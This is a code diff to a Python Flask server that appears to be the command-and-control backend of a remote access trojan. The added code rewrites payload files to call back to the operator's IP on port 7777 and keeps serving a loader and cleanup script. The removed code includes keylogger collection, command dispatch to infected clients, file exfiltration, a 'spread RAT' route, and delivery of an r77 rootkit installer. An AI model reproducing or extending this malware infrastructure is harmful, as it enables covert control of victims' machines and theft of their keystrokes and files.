@@ -2,6 +2,7 @@ from flask import Flask, request, send_from_directory, jsonify, Response
 import os
 import time
 from blessed import Terminal
+import socket
 
 app = Flask(__name__)
 
@@ -10,13 +11,13 @@ CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
 UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
 FILE_NAME = 'InMemLoader.exe'
 clean_name = 'clean.bat'
+forwarded = False
 
 os.makedirs(CODE_DIR, exist_ok=True)
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
 selected_code_file = None
-
 
 def info():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -28,15 +29,73 @@ def info():
     print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
     time.sleep(0.5)
 
-@app.route('/log', methods=['POST'])
-def log():
-    raw_data = request.form.get("data", "")
-    
-    # Just log the raw data without timestamp
-    with open("keylog.log", "a", encoding="utf-8") as f:
-        f.write(raw_data)  # Ensure no extra newline is added here
+def adjust_payload():
+    global forwarded, available_code_files
+    # Get the public IP or local IP based on the forwarded flag
+    ip_address = "localhost"  # default local IP
+    if forwarded:
+        ip_address = socket.gethostbyname(socket.gethostname())  # Get the local machine IP
 
-    return "OK", 200
+    # Iterate through all payload files in the directory
+    for file_name in available_code_files:
+        file_path = os.path.join(CODE_DIR, file_name)
+
+        # Read the file and replace the URL
+        with open(file_path, "r") as file:
+            content = file.read()
+
+        # Modify the URL in the selected code file
+        new_content = content.replace("URL_PLACEHOLDER", f"http://{ip_address}:7777")
+
+        # Write the changes back to the file
+        with open(file_path, "w") as file:
+            file.write(new_content)
+
+        print(f"[*] Adjusted URL in {file_name} to {ip_address}")
+
+def ask_if_forwarded():
+    global forwarded  # Make sure we're modifying the global variable
+    print("Do you have your port open?")
+    term = Terminal()
+
+    menu = ['Yes', 'No', 'Exit']
+    selected = 0
+    forwarded = None  # Initialize the variable
+
+    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
+        print(term.clear)
+        print("Do you have a forwarded port?")
+        while True:
+            print(term.move_yx(0, 0))
+            for i, item in enumerate(menu):
+                if i == selected:
+                    print(term.underline + item + term.normal)
+                else:
+                    print(item)
+
+            key = term.inkey()
+
+            if key.name == 'KEY_UP' and selected > 0:
+                selected -= 1
+            elif key.name == 'KEY_DOWN' and selected < len(menu) - 1:
+                selected += 1
+            elif key.name == 'KEY_ENTER' or key == '\n':
+                # Process the selection
+                if menu[selected] == 'Yes':
+                    forwarded = True
+                elif menu[selected] == 'No':
+                    forwarded = False
+                elif menu[selected] == 'Exit':
+                    print(term.move_yx(0, len(menu) + 1) + "Exiting...")
+                    break  # Exit the loop and function
+
+                # Once an option is selected, break the loop
+                break
+
+        # If 'Exit' is selected, we exit out of the program.
+        if forwarded is None:
+            print("No selection made. Exiting...")
+            exit(0)  # Exit the program if no selection is made
 
 # ==== Interactive Blessed Menu ====
 def choose_code_file():
@@ -78,14 +137,7 @@ def choose_code_file():
                     time.sleep(1)
                     break
 
-
-
-# ==== Client State ====
-clients = {}
-current_cmd = ""
-last_result = ""
-
-
+# ==== Flask Routes ====
 @app.route("/code")
 def serve_code():
     if not selected_code_file:
@@ -95,7 +147,6 @@ def serve_code():
             return Response(f.read(), mimetype='text/plain')
     except Exception as e:
         return f"Error reading file: {str(e)}", 500
-
 
 @app.route('/install', methods=['GET'])
 def download_v2():
@@ -107,7 +158,6 @@ def download_v2():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-
 @app.route('/clean', methods=['GET'])
 def clean():
     try:
@@ -118,110 +168,10 @@ def clean():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-
-def xor(data, key="nullbeacon"):
-    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
-
-
-@app.route('/client_info', methods=['POST'])
-def update_client_info():
-    client_id = request.data.decode()
-    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
-    print(f"[*] Client {client_id} updated or connected.")
-    return "OK"
-
-
-@app.route('/get', methods=['GET'])
-def get_command():
-    return current_cmd
-
-
-@app.route('/set', methods=['POST'])
-def set_command():
-    global current_cmd
-    current_cmd = request.data.decode()
-    return "OK"
-
-
-@app.route('/result', methods=['POST'])
-def post_result():
-    global last_result
-    encrypted = request.data.decode()
-    last_result = xor(encrypted)
-    return "OK"
-
-
-@app.route('/last', methods=['GET'])
-def get_last_result():
-    return last_result or "[*] No result yet."
-
-
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    file = request.files.get('file')
-    if file:
-        path = os.path.join(UPLOAD_DIR, file.filename)
-        file.save(path)
-        print(f"[+] File uploaded: {file.filename}")
-        return "OK"
-    return "No file"
-
-
-@app.route('/broadcast', methods=['POST'])
-def broadcast_command():
-    global current_cmd
-    cmd = request.data.decode()
-    current_cmd = cmd
-    print(f"[!] Broadcasting command to all clients: {cmd}")
-    return "Broadcast sent"
-
-
-@app.route('/download/<filename>', methods=['GET'])
-def download_file(filename):
-    try:
-        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
-    except Exception:
-        return "File not found", 404
-
-
-@app.route('/spread', methods=['POST'])
-def spread():
-    print("[*] Command received to spread RAT to all clients.")
-    for client_id, client_data in clients.items():
-        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
-    return "Spreading started."
-
-
-@app.route('/clients', methods=['GET'])
-def list_clients():
-    return {"clients": list(clients.keys())}
-
-
-# ==== Payload + Shellcode Routes ====
-PAYLOAD_DIR = r'C:\Users\mxmla\source\repos\InMemLoader\InMemLoader\bin\Debug\net8.0'
-PAYLOAD_FILE = 'InMemLoader.exe'
-Shellcode_dir = r'C:\Users\mxmla\Downloads\r77Rootkit 1.7.0'
-shellcode_FILE = 'install.exe'
-
-
-@app.route('/payload', methods=['GET'])
-def download_payload():
-    try:
-        return send_from_directory(PAYLOAD_DIR, PAYLOAD_FILE, as_attachment=True)
-    except Exception as e:
-        return f"Error: {str(e)}", 500
-
-
-@app.route('/shellcode', methods=['GET'])
-def download_shellcode():
-    try:
-        return send_from_directory(Shellcode_dir, shellcode_FILE, as_attachment=True)
-    except Exception as e:
-        return f"Error: {str(e)}", 500
-
-
 # ==== Run Server ====
 if __name__ == "__main__":
     info()
-    choose_code_file()
+    ask_if_forwarded()  # Ask if port is forwarded
+    adjust_payload()  # Adjust all payload files based on forwarding status
+    choose_code_file()  # Let the user choose a payload file
     app.run(host="0.0.0.0", port=7777)
